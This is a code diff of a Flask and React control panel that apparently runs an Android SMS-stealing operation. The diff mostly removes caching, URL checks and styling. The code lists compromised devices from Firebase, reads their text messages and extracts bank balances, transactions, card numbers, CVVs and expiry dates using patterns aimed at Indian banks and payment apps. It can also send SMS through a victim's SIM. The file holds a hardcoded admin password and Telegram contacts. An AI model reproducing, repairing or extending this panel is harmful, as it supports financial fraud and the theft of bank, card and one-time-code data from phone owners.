@@ -2,8 +2,6 @@ from flask import Flask, Response, request, jsonify
 import os
 import time
 import json
-import threading
-import concurrent.futures
 import random
 import string
 import urllib.request
@@ -18,11 +16,11 @@ ADMIN_PASSWORD = "Noobster@2024"
 TELEGRAM_CHANNEL = "https://t.me/noobsterrr"
 CONTACT_USERNAME = "@Noobstar9"
 
-# ============================================================
-# STORAGE (JSON on disk)
-# ============================================================
-DATA_FILE = os.path.join(os.path.dirname(__file__), "panel_data.json")
+DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "panel_data.json")
 
+# ============================================================
+# STORAGE
+# ============================================================
 def load_data():
     if not os.path.exists(DATA_FILE):
         return {"firebases": [], "api_keys": [], "status": {"online": True, "broadcast": ""}}
@@ -44,26 +42,12 @@ def save_data(d):
         pass
 
 # ============================================================
-# CACHE (in-memory, refreshed by background thread)
+# FIREBASE
 # ============================================================
-CACHE = {
-    "devices": [],           # all devices from all firebases
-    "per_account": {},       # { fb_id: count }
-    "errors": {},            # { fb_id: error_msg }
-    "last_refresh": 0,       # timestamp
-    "lock": threading.Lock(),
-    "ready": False
-}
-
-# ============================================================
-# FIREBASE FETCH (server-side)
-# ============================================================
-def fetch_firebase(url, key, path, timeout=6):
+def fetch_firebase(url, key, path, timeout=8):
     u = (url or "").strip().rstrip("/")
     if not u.startswith("http"):
         u = "https://" + u
-    if "firebaseio.com" not in u and "firebasedatabase.app" not in u:
-        raise ValueError("Invalid URL")
     full = u + "/" + path + ".json?auth=" + (key or "").strip()
     req = urllib.request.Request(full, headers={"Accept": "application/json"})
     try:
@@ -79,9 +63,9 @@ def fetch_firebase(url, key, path, timeout=6):
             raise ValueError("PERMISSION_DENIED")
         raise ValueError("HTTP_" + str(e.code))
     except urllib.error.URLError as e:
-        raise ValueError("NETWORK_" + str(e.reason))
+        raise ValueError("NET_" + str(e.reason)[:30])
     except Exception as e:
-        raise ValueError("FETCH_" + str(e)[:60])
+        raise ValueError("ERR_" + str(e)[:40])
 
 def firebase_put(url, key, path, data):
     u = (url or "").strip().rstrip("/")
@@ -106,14 +90,12 @@ def firebase_delete(url, key, path):
         with urllib.request.urlopen(req, timeout=10) as res:
             return True
     except urllib.error.HTTPError as e:
-        if e.code in (401, 403):
-            raise ValueError("PERMISSION_DENIED")
         raise ValueError("HTTP_" + str(e.code))
 
 # ============================================================
-# DEVICE PARSER
+# PARSERS
 # ============================================================
-def parse_device(d_id, d, acc_url, acc_id, acc_name):
+def parse_device(d_id, d, acc_id, acc_name):
     if not isinstance(d, dict):
         return None
     sims = d.get("sims") or []
@@ -144,8 +126,8 @@ def parse_device(d_id, d, acc_url, acc_id, acc_name):
 
     phone = d.get("mobNo")
     if not phone and sims:
-        first = sims[0] if isinstance(sims[0], dict) else {}
-        phone = first.get("phoneNumber")
+        f = sims[0] if isinstance(sims[0], dict) else {}
+        phone = f.get("phoneNumber")
 
     return {
         "id": d_id,
@@ -187,70 +169,7 @@ def parse_messages(mdata):
     return out
 
 # ============================================================
-# CACHE REFRESH (runs in background thread)
-# ============================================================
-def refresh_cache():
-    """Fetch all firebases in parallel and update cache"""
-    d = load_data()
-    fbs = d["firebases"]
-
-    all_devices = []
-    per_account = {}
-    errors = {}
-
-    def fetch_one(fb):
-        try:
-            raw = fetch_firebase(fb["url"], fb["key"], "clients", timeout=5)
-            out = []
-            if raw and isinstance(raw, dict):
-                for did, dev in raw.items():
-                    parsed = parse_device(did, dev, fb["url"], fb["id"], fb["name"])
-                    if parsed:
-                        out.append(parsed)
-            return (fb["id"], out, None)
-        except ValueError as e:
-            return (fb["id"], [], str(e))
-        except Exception as e:
-            return (fb["id"], [], "ERR_" + str(e)[:40])
-
-    if fbs:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
-            futures = [ex.submit(fetch_one, fb) for fb in fbs]
-            try:
-                for fut in concurrent.futures.as_completed(futures, timeout=15):
-                    try:
-                        fb_id, devs, err = fut.result(timeout=1)
-                        all_devices.extend(devs)
-                        per_account[fb_id] = len(devs)
-                        if err:
-                            errors[fb_id] = err
-                    except Exception:
-                        pass
-            except concurrent.futures.TimeoutError:
-                pass
-
-    with CACHE["lock"]:
-        CACHE["devices"] = all_devices
-        CACHE["per_account"] = per_account
-        CACHE["errors"] = errors
-        CACHE["last_refresh"] = int(time.time() * 1000)
-        CACHE["ready"] = True
-
-def background_refresher():
-    """Refresh cache every 5 seconds forever"""
-    while True:
-        try:
-            refresh_cache()
-        except Exception:
-            pass
-        time.sleep(5)
-
-def start_background():
-    t = threading.Thread(target=background_refresher, daemon=True)
-    t.start()
-
-# ============================================================
-# PAGE HTML
+# HTML
 # ============================================================
 PAGE_HTML = r"""<!DOCTYPE html>
 <html lang="en">
@@ -261,25 +180,23 @@ PAGE_HTML = r"""<!DOCTYPE html>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
 <style>
 *, :before, :after { box-sizing: border-box; border: 0 solid; margin: 0; padding: 0; }
-:root { --border: #1f1f1f; }
 html, body {
-  line-height: 1.5;
   font-family: "Inter", ui-sans-serif, system-ui, sans-serif;
   -webkit-font-smoothing: antialiased;
   min-height: 100vh;
 }
 body {
-  background: radial-gradient(at 0% 0%, rgba(59,130,246,0.10) 0px, transparent 50%),
-              radial-gradient(at 100% 0%, rgba(139,92,246,0.10) 0px, transparent 50%),
-              radial-gradient(at 50% 100%, rgba(6,182,212,0.06) 0px, transparent 50%),
-              #020202;
-  background-attachment: fixed;
+  background: #020202;
   color: #e8e8e8;
+  background-image:
+    radial-gradient(at 0% 0%, rgba(59,130,246,0.10) 0px, transparent 50%),
+    radial-gradient(at 100% 0%, rgba(139,92,246,0.10) 0px, transparent 50%);
+  background-attachment: fixed;
 }
-button, input, textarea, select { font: inherit; color: inherit; background: transparent; border-radius: 0; }
-img, svg { display: block; max-width: 100%; height: auto; }
-h1,h2,h3,h4,h5,h6 { font-size: inherit; font-weight: inherit; }
+button, input, textarea, select { font: inherit; color: inherit; background: transparent; }
+img { display: block; max-width: 100%; height: auto; }
 a { color: inherit; text-decoration: none; }
+h1,h2,h3 { font-size: inherit; font-weight: inherit; }
 
 .min-h-screen { min-height: 100vh; }
 .flex { display: flex; }
@@ -300,30 +217,24 @@ a { color: inherit; text-decoration: none; }
 .gap-1 { gap: .25rem; }
 .gap-1\.5 { gap: .375rem; }
 .gap-2 { gap: .5rem; }
-.gap-2\.5 { gap: .625rem; }
 .gap-3 { gap: .75rem; }
-.gap-4 { gap: 1rem; }
-.p-1 { padding: .25rem; }
 .p-1\.5 { padding: .375rem; }
 .p-2 { padding: .5rem; }
 .p-2\.5 { padding: .625rem; }
 .p-3 { padding: .75rem; }
 .p-4 { padding: 1rem; }
 .p-5 { padding: 1.25rem; }
-.p-6 { padding: 1.5rem; }
 .p-8 { padding: 2rem; }
 .px-2 { padding-inline: .5rem; }
 .px-3 { padding-inline: .75rem; }
 .px-4 { padding-inline: 1rem; }
 .px-5 { padding-inline: 1.25rem; }
 .px-6 { padding-inline: 1.5rem; }
-.py-1 { padding-block: .25rem; }
 .py-1\.5 { padding-block: .375rem; }
 .py-2 { padding-block: .5rem; }
 .py-2\.5 { padding-block: .625rem; }
 .py-3 { padding-block: .75rem; }
 .py-4 { padding-block: 1rem; }
-.py-6 { padding-block: 1.5rem; }
 .py-8 { padding-block: 2rem; }
 .py-12 { padding-block: 3rem; }
 .py-24 { padding-block: 6rem; }
@@ -336,12 +247,10 @@ a { color: inherit; text-decoration: none; }
 .mb-2 { margin-bottom: .5rem; }
 .mb-3 { margin-bottom: .75rem; }
 .mb-4 { margin-bottom: 1rem; }
-.mb-5 { margin-bottom: 1.25rem; }
 .mb-6 { margin-bottom: 1.5rem; }
 .ml-auto { margin-left: auto; }
 .mx-auto { margin-inline: auto; }
 .w-full { width: 100%; }
-.w-1\.5 { width: .375rem; }
 .w-2 { width: .5rem; }
 .w-3 { width: .75rem; }
 .w-4 { width: 1rem; }
@@ -350,11 +259,8 @@ a { color: inherit; text-decoration: none; }
 .w-7 { width: 1.75rem; }
 .w-8 { width: 2rem; }
 .w-9 { width: 2.25rem; }
-.w-10 { width: 2.5rem; }
 .w-16 { width: 4rem; }
 .w-20 { width: 5rem; }
-.w-96 { width: 24rem; }
-.h-1\.5 { height: .375rem; }
 .h-2 { height: .5rem; }
 .h-3 { height: .75rem; }
 .h-4 { height: 1rem; }
@@ -363,31 +269,25 @@ a { color: inherit; text-decoration: none; }
 .h-7 { height: 1.75rem; }
 .h-8 { height: 2rem; }
 .h-9 { height: 2.25rem; }
-.h-10 { height: 2.5rem; }
 .h-16 { height: 4rem; }
 .h-20 { height: 5rem; }
-.h-96 { height: 24rem; }
 .h-full { height: 100%; }
 .max-w-md { max-width: 28rem; }
 .max-w-screen-2xl { max-width: 96rem; }
-.max-h-96 { max-height: 24rem; }
-.rounded { border-radius: .25rem; }
 .rounded-lg { border-radius: .5rem; }
 .rounded-xl { border-radius: .75rem; }
 .rounded-2xl { border-radius: 1rem; }
 .rounded-3xl { border-radius: 1.5rem; }
 .rounded-full { border-radius: 9999px; }
-.border { border: 1px solid var(--border); }
-.border-b { border-bottom: 1px solid var(--border); }
+.border { border: 1px solid #1f1f1f; }
+.border-b { border-bottom: 1px solid #1f1f1f; }
 .text-center { text-align: center; }
-.text-right { text-align: right; }
 .text-xs { font-size: .75rem; }
 .text-sm { font-size: .875rem; }
 .text-base { font-size: 1rem; }
 .text-lg { font-size: 1.125rem; }
 .text-xl { font-size: 1.25rem; }
 .text-2xl { font-size: 1.5rem; }
-.text-3xl { font-size: 1.875rem; }
 .text-\[9px\] { font-size: 9px; }
 .text-\[10px\] { font-size: 10px; }
 .text-\[11px\] { font-size: 11px; }
@@ -408,12 +308,9 @@ a { color: inherit; text-decoration: none; }
 .opacity-30 { opacity: .3; }
 .opacity-50 { opacity: .5; }
 .text-white { color: #fff; }
-.text-black { color: #000; }
 .text-red-300 { color: #fca5a5; }
 .text-red-400 { color: #f87171; }
-.text-red-500 { color: #ef4444; }
 .text-emerald-400 { color: #4ade80; }
-.text-emerald-500 { color: #22c55e; }
 .text-blue-400 { color: #60a5fa; }
 .text-purple-400 { color: #c084fc; }
 .text-amber-400 { color: #fbbf24; }
@@ -427,56 +324,31 @@ a { color: inherit; text-decoration: none; }
 .text-\[\#aaa\] { color: #aaa; }
 .text-\[\#ccc\] { color: #ccc; }
 .bg-black { background-color: #000; }
-.bg-white\/5 { background-color: rgba(255,255,255,0.05); }
-.bg-white\/10 { background-color: rgba(255,255,255,0.1); }
 .bg-red-600 { background-color: #dc2626; }
-.bg-red-950\/20 { background-color: rgba(69,10,10,0.2); }
-.bg-red-950\/30 { background-color: rgba(69,10,10,0.3); }
-.bg-red-950\/40 { background-color: rgba(69,10,10,0.4); }
 .bg-emerald-500 { background-color: #22c55e; }
-.bg-emerald-500\/10 { background-color: rgba(34,197,94,0.1); }
 .bg-emerald-500\/15 { background-color: rgba(34,197,94,0.15); }
 .bg-emerald-950\/20 { background-color: rgba(2,44,34,0.2); }
-.bg-purple-500\/15 { background-color: rgba(168,85,247,0.15); }
 .bg-purple-950\/20 { background-color: rgba(59,7,100,0.2); }
 .bg-amber-500\/10 { background-color: rgba(245,158,11,0.1); }
-.bg-blue-950\/60 { background-color: rgba(23,37,84,0.6); }
 .bg-black\/70 { background-color: rgba(0,0,0,0.7); }
-.bg-\[\#0a0a0a\] { background-color: #0a0a0a; }
-.bg-\[\#0a0a0a\]\/80 { background-color: rgba(10,10,10,0.8); }
 .bg-\[\#080808\] { background-color: #080808; }
 .bg-\[\#0d0d0d\] { background-color: #0d0d0d; }
-.bg-\[\#0f0a1a\] { background-color: #0f0a1a; }
-.bg-\[\#0a1410\] { background-color: #0a1410; }
-.bg-\[\#0a130d\] { background-color: #0a130d; }
 .bg-\[\#111\] { background-color: #111; }
-.bg-\[\#131313\] { background-color: #131313; }
-.bg-\[\#151515\] { background-color: #151515; }
 .bg-\[\#1a1a1a\] { background-color: #1a1a1a; }
 .bg-\[\#222\] { background-color: #222; }
+.bg-\[\#0a1410\] { background-color: #0a1410; }
+.bg-\[\#0a130d\] { background-color: #0a130d; }
+.bg-\[\#0f0a1a\] { background-color: #0f0a1a; }
 .border-\[\#1a1a1a\] { border-color: #1a1a1a; }
 .border-\[\#1f1f1f\] { border-color: #1f1f1f; }
 .border-\[\#222\] { border-color: #222; }
-.border-\[\#262626\] { border-color: #262626; }
-.border-\[\#333\] { border-color: #333; }
-.border-\[\#2a2a2a\] { border-color: #2a2a2a; }
-.border-emerald-500\/25 { border-color: rgba(34,197,94,0.25); }
 .border-emerald-900\/30 { border-color: rgba(6,78,59,0.3); }
-.border-emerald-900\/40 { border-color: rgba(6,78,59,0.4); }
-.border-purple-500\/25 { border-color: rgba(168,85,247,0.25); }
-.border-purple-900\/30 { border-color: rgba(88,28,135,0.3); }
-.border-red-900\/30 { border-color: rgba(127,29,29,0.3); }
-.border-amber-500\/20 { border-color: rgba(245,158,11,0.2); }
-.border-transparent { border-color: transparent; }
-.border-dashed { border-style: dashed; }
-.shadow-lg { box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
+.border-\[\#2a2a2a\] { border-color: #2a2a2a; }
+.border-\[\#333\] { border-color: #333; }
 .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); }
-.shadow-2xl { box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); }
 .backdrop-blur-md { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
 .backdrop-blur-sm { backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); }
-.transition { transition: all .15s ease; }
 .transition-all { transition: all .15s ease; }
-.duration-500 { transition-duration: .5s; }
 .animate-pulse { animation: pulse 2s infinite; }
 .animate-spin { animation: spin 1s linear infinite; }
 .animate-fade-up { animation: fadeUp .3s ease-out; }
@@ -484,15 +356,12 @@ a { color: inherit; text-decoration: none; }
 @keyframes pulse { 50% { opacity: .5; } }
 @keyframes fadeUp { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
 .red-gradient { background: linear-gradient(135deg, #dc2626, #c2410c); }
-.glass-card { backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); background: rgba(17,17,17,0.9); border: 1px solid rgba(255,255,255,0.06); }
+.glass-card { background: rgba(17,17,17,0.92); border: 1px solid rgba(255,255,255,0.06); }
 .grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
 .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-.grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
-.grid-cols-6 { grid-template-columns: repeat(6, minmax(0, 1fr)); }
 @media (min-width: 640px) { .sm\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } .sm\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } .sm\:grid-cols-6 { grid-template-columns: repeat(6, minmax(0, 1fr)); } }
-@media (min-width: 1024px) { .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } .lg\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)); } .lg\:grid-cols-6 { grid-template-columns: repeat(6, minmax(0, 1fr)); } }
+@media (min-width: 1024px) { .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } .lg\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)); } }
 .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-.tabular-nums { font-variant-numeric: tabular-nums; }
 .z-40 { z-index: 40; }
 .z-50 { z-index: 50; }
 .sticky { position: sticky; }
@@ -503,16 +372,10 @@ a { color: inherit; text-decoration: none; }
 .-translate-y-1\/2 { transform: translateY(-50%); }
 .top-1\/2 { top: 50%; }
 .left-3 { left: .75rem; }
-.focus\:border-red-500:focus { border-color: #ef4444; }
 .outline-none { outline: none; }
-.placeholder\:text-\[\#444\]::placeholder { color: #444; }
-.hover\:bg-red-900\/60:hover { background-color: rgba(127,29,29,0.6); }
-.hover\:bg-red-700:hover { background-color: #b91c1c; }
-.hover\:text-white:hover { color: #fff; }
 .hover\:text-red-400:hover { color: #f87171; }
 .hover\:opacity-90:hover { opacity: .9; }
 .disabled\:opacity-50:disabled { opacity: .5; }
-.disabled\:cursor-not-allowed:disabled { cursor: not-allowed; }
 
 #telegramPopup {
   position: fixed; inset: 0;
@@ -535,7 +398,7 @@ a { color: inherit; text-decoration: none; }
   display: inline-block; padding: 14px 30px;
   background: linear-gradient(145deg, #ffffff, #e0ecff);
   color: #0066aa; font-weight: 700; font-size: 16px;
-  border-radius: 60px; border: none; cursor: pointer;
+  border-radius: 60px; cursor: pointer;
 }
 .popup-close-btn {
   position: absolute; top: 14px; right: 18px;
@@ -543,7 +406,6 @@ a { color: inherit; text-decoration: none; }
   font-size: 20px; width: 32px; height: 32px; border-radius: 50%;
   cursor: pointer;
 }
-
 #root { min-height: 100vh; }
 </style>
 </head>
@@ -562,17 +424,16 @@ a { color: inherit; text-decoration: none; }
 <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
 <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
 <script>
-const { useState, useEffect, useCallback, useMemo, useRef, Fragment } = React;
+const { useState, useEffect, useCallback, useMemo, Fragment } = React;
 const e = React.createElement;
 
 const CFG = {
-  CONTACT_USERNAME: "__CONTACT_USERNAME__",
-  TELEGRAM_CHANNEL: "__TELEGRAM_CHANNEL__"
+  CONTACT_USERNAME: "__CONTACT_USERNAME__"
 };
 const K_ADMIN = "nb_admin";
 
 // ============================================================
-// API HELPERS
+// API HELPER
 // ============================================================
 async function api(path, opts = {}) {
   const res = await fetch(path, {
@@ -588,13 +449,12 @@ async function api(path, opts = {}) {
 // SMS ANALYSIS
 // ============================================================
 const BANK_PATTERNS = [
-  [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"], [/SBIIN|SBIINB|SBI/i, "SBI"], [/ICICIB|ICICI/i, "ICICI Bank"],
-  [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"], [/KOTAKB|KOTAK/i, "Kotak Bank"], [/PNBSMS|PNB/i, "PNB"],
-  [/BOIIND|BOI/i, "Bank of India"], [/CANBNK|CANARA/i, "Canara Bank"], [/UNIONB|UBISMS/i, "Union Bank"],
-  [/YESBNK|YESBANK/i, "Yes Bank"], [/IDBIBK|IDBI/i, "IDBI Bank"], [/INDUSB|INDUSIND/i, "IndusInd Bank"],
-  [/FEDERAL|FEDBNK/i, "Federal Bank"], [/RBLBNK|RBL/i, "RBL Bank"], [/PAYTM/i, "Paytm"],
-  [/PHONEPE|PHNPE/i, "PhonePe"], [/GPAY|GOOGLEPAY/i, "Google Pay"], [/AMAZONPAY/i, "Amazon Pay"],
-  [/CRED/i, "CRED"], [/AIRTEL/i, "Airtel Payments"], [/JIOMNY|JIOMONEY/i, "Jio Money"]
+  [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"], [/SBIIN|SBI/i, "SBI"], [/ICICIB|ICICI/i, "ICICI Bank"],
+  [/AXISBK|AXIS/i, "Axis Bank"], [/KOTAKB|KOTAK/i, "Kotak Bank"], [/PNBSMS|PNB/i, "PNB"],
+  [/BOIIND|BOI/i, "Bank of India"], [/CANBNK|CANARA/i, "Canara Bank"], [/UNIONB/i, "Union Bank"],
+  [/YESBNK|YESBANK/i, "Yes Bank"], [/IDBIBK|IDBI/i, "IDBI Bank"], [/INDUSB/i, "IndusInd Bank"],
+  [/FEDERAL/i, "Federal Bank"], [/RBLBNK|RBL/i, "RBL Bank"], [/PAYTM/i, "Paytm"],
+  [/PHONEPE/i, "PhonePe"], [/GPAY|GOOGLEPAY/i, "Google Pay"], [/AMAZONPAY/i, "Amazon Pay"]
 ];
 const BAL_PATTERNS = [
   /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
@@ -607,16 +467,16 @@ const TXN_PATTERNS = [
   /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i
 ];
 const CARD_PATTERNS = [/card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i];
-const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
-const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
+const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc)[\s:]+([0-9]{3,4})/i];
+const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
 
 function detectBank(sender) {
   for (const [re, name] of BANK_PATTERNS) if (re.test(sender)) return name;
   return sender || "Bank";
 }
 function detectBankSMS(text, sender) {
-  if (!text || text.trim().length < 8) return null;
-  if (!/AVL|AVAL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|A\/C|ACCOUNT|INR/i.test(text)) return null;
+  if (!text || text.length < 8) return null;
+  if (!/AVL|AVAL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|A\/C|ACCOUNT|INR/i.test(text)) return null;
   let balance = null;
   for (const re of BAL_PATTERNS) { const m = text.match(re); if (m && m[1]) { balance = m[1].replace(/,/g, ""); break; } }
   if (!balance) return null;
@@ -624,12 +484,12 @@ function detectBankSMS(text, sender) {
   for (const re of TXN_PATTERNS) { const m = text.match(re); if (m && m[1] && m[1].replace(/,/g, "") !== balance) { amount = m[1].replace(/,/g, ""); break; } }
   let type = null;
   if (/credit(?:ed)?/i.test(text)) type = "credit";
-  else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) type = "debit";
-  return { bankName: detectBank(sender), senderName: sender || "Unknown", availableBalance: balance, transactionAmount: amount, transactionType: type, rawSms: text };
+  else if (/debit(?:ed)?|withdraw|paid/i.test(text)) type = "debit";
+  return { bankName: detectBank(sender), availableBalance: balance, transactionAmount: amount, transactionType: type, rawSms: text };
 }
 function detectCard(text) {
   if (!text) return null;
-  if (!/CARD|CVV|CREDIT|DEBIT/.test(text.toUpperCase())) return null;
+  if (!/CARD|CVV|CREDIT|DEBIT/i.test(text)) return null;
   let last4 = null;
   for (const re of CARD_PATTERNS) { const m = text.match(re); if (m && m[1]) { const d = m[1].replace(/[^0-9]/g, ""); if (d.length >= 4) { last4 = d.slice(-4); break; } } }
   if (!last4) return null;
@@ -640,7 +500,7 @@ function detectCard(text) {
   let cvv = "", expiry = "";
   for (const re of CVV_PATTERNS) { const m = text.match(re); if (m && m[1]) { cvv = m[1]; break; } }
   for (const re of EXP_PATTERNS) { const m = text.match(re); if (m && m[1]) { expiry = m[1]; break; } }
-  return { cardLast4: last4, cardType, cvv: cvv || undefined, expiry: expiry || undefined, rawSms: text };
+  return { cardLast4: last4, cardType, cvv, expiry };
 }
 function analyzeSMS(messages) {
   const bankBalances = [], cards = [];
@@ -661,7 +521,6 @@ const Icon = ({ name, size = 16, className = "" }) => {
     wifi: e(Fragment, null, e("path", { d: "M12 20h.01" }), e("path", { d: "M2 8.82a15 15 0 0 1 20 0" }), e("path", { d: "M5 12.859a10 10 0 0 1 14 0" }), e("path", { d: "M8.5 16.429a5 5 0 0 1 7 0" })),
     copy: e(Fragment, null, e("rect", { width: 14, height: 14, x: 8, y: 8, rx: 2 }), e("path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" })),
     x: e(Fragment, null, e("path", { d: "M18 6 6 18" }), e("path", { d: "m6 6 12 12" })),
-    plus: e(Fragment, null, e("path", { d: "M5 12h14" }), e("path", { d: "M12 5v14" })),
     trash: e(Fragment, null, e("path", { d: "M10 11v6" }), e("path", { d: "M14 11v6" }), e("path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6" }), e("path", { d: "M3 6h18" }), e("path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" })),
     refresh: e(Fragment, null, e("path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" }), e("path", { d: "M21 3v5h-5" }), e("path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" }), e("path", { d: "M8 16H3v5" })),
     logout: e(Fragment, null, e("path", { d: "m16 17 5-5-5-5" }), e("path", { d: "M21 12H9" }), e("path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" })),
@@ -765,17 +624,23 @@ function DeviceDetail({ dev, apiKey, onClose, showToast }) {
   const [sending, setSending] = useState(false);
   const [sendSim, setSendSim] = useState(1);
 
-  const loadMessages = useCallback(async () => {
-    try {
-      const r = await api("/api/device/" + encodeURIComponent(dev._accountId) + "/" + encodeURIComponent(dev.id) + "/messages?key=" + encodeURIComponent(apiKey));
-      const parsed = r.messages || [];
-      setMessages(parsed);
-      setAnalysis(analyzeSMS(parsed));
-    } catch { setMessages([]); }
-    finally { setLoading(false); }
+  useEffect(() => {
+    let cancelled = false;
+    const load = async () => {
+      try {
+        const r = await api("/api/device/" + encodeURIComponent(dev._accountId) + "/" + encodeURIComponent(dev.id) + "/messages?key=" + encodeURIComponent(apiKey));
+        if (!cancelled) {
+          const parsed = r.messages || [];
+          setMessages(parsed);
+          setAnalysis(analyzeSMS(parsed));
+        }
+      } catch {}
+      finally { if (!cancelled) setLoading(false); }
+    };
+    load();
+    const iv = setInterval(load, 8000);
+    return () => { cancelled = true; clearInterval(iv); };
   }, [dev.id, dev._accountId, apiKey]);
-
-  useEffect(() => { loadMessages(); const iv = setInterval(loadMessages, 8000); return () => clearInterval(iv); }, [loadMessages]);
 
   const send = async () => {
     if (!sendTo || !sendMsg) { showToast("Fill fields", "error"); return; }
@@ -786,7 +651,7 @@ function DeviceDetail({ dev, apiKey, onClose, showToast }) {
       });
       showToast("SMS queued!", "success");
       setSendMsg("");
-    } catch (e) { showToast("Failed: " + e.message, "error"); }
+    } catch (err) { showToast("Failed", "error"); }
     finally { setSending(false); }
   };
 
@@ -796,7 +661,7 @@ function DeviceDetail({ dev, apiKey, onClose, showToast }) {
       await api("/api/device/" + encodeURIComponent(dev._accountId) + "/" + encodeURIComponent(dev.id) + "/delete?key=" + encodeURIComponent(apiKey), { method: "DELETE" });
       showToast("Deleted", "success");
       onClose();
-    } catch (e) { showToast("Failed", "error"); }
+    } catch { showToast("Failed", "error"); }
   };
 
   const tabs = [
@@ -872,9 +737,9 @@ function DeviceDetail({ dev, apiKey, onClose, showToast }) {
           e("p", { className: "text-[10px] uppercase tracking-widest mb-2", style: { color: "#555" } }, "SIM"),
           e("div", { className: "flex gap-2 mb-3" }, [1, 2].map(n => e("button", { key: n, onClick: () => setSendSim(n), className: "flex-1 py-2 rounded-lg text-sm font-bold", style: { background: sendSim === n ? "#dc2626" : "#111", color: sendSim === n ? "#fff" : "#666", border: "1px solid " + (sendSim === n ? "transparent" : "#222") } }, "SIM " + n))),
           e("p", { className: "text-[10px] uppercase tracking-widest mb-2", style: { color: "#555" } }, "Recipient"),
-          e("input", { value: sendTo, onChange: ev => setSendTo(ev.target.value), placeholder: "+919876543210", className: "w-full px-3 py-2 rounded-lg text-sm font-mono mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          e("input", { value: sendTo, onChange: ev => setSendTo(ev.target.value), placeholder: "+919876543210", className: "w-full px-3 py-2 rounded-lg text-sm font-mono mb-3 outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
           e("p", { className: "text-[10px] uppercase tracking-widest mb-2", style: { color: "#555" } }, "Message"),
-          e("textarea", { value: sendMsg, onChange: ev => setSendMsg(ev.target.value), rows: 4, placeholder: "Type message…", className: "w-full px-3 py-2 rounded-lg text-sm mb-3 resize-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
+          e("textarea", { value: sendMsg, onChange: ev => setSendMsg(ev.target.value), rows: 4, placeholder: "Type message…", className: "w-full px-3 py-2 rounded-lg text-sm mb-3 resize-none outline-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
           e("button", { onClick: send, disabled: sending, className: "w-full py-2.5 rounded-lg font-bold text-sm text-white disabled:opacity-50", style: { background: "#dc2626" } }, sending ? "Sending…" : "Send via SIM " + sendSim)
         )
       )
@@ -900,42 +765,46 @@ function PublicPanel({ apiKey, onLogout }) {
   const [search, setSearch] = useState("");
   const [toast, setToast] = useState(null);
   const [err, setErr] = useState("");
-  const [now, setNow] = useState(new Date());
   const [broadcast, setBroadcast] = useState("");
 
   const showToast = useCallback((msg, type = "info") => setToast({ msg, type, id: Date.now() }), []);
 
-  const loadDevices = useCallback(async (silent) => {
+  const loadDevices = useCallback(async () => {
     try {
       const r = await api("/api/devices?key=" + encodeURIComponent(apiKey));
       const list = (r.devices || []).filter(d => d.status === true);
       setDevices(list);
       setBroadcast(r.broadcast || "");
       setErr("");
-      setLoading(false);
-
-      // SMS analysis for new devices only
-      const newAnalyses = {};
-      await Promise.all(list.map(async (dev) => {
-        if (analyses[dev.id]) { newAnalyses[dev.id] = analyses[dev.id]; return; }
-        try {
-          const m = await api("/api/device/" + encodeURIComponent(dev._accountId) + "/" + encodeURIComponent(dev.id) + "/messages?key=" + encodeURIComponent(apiKey));
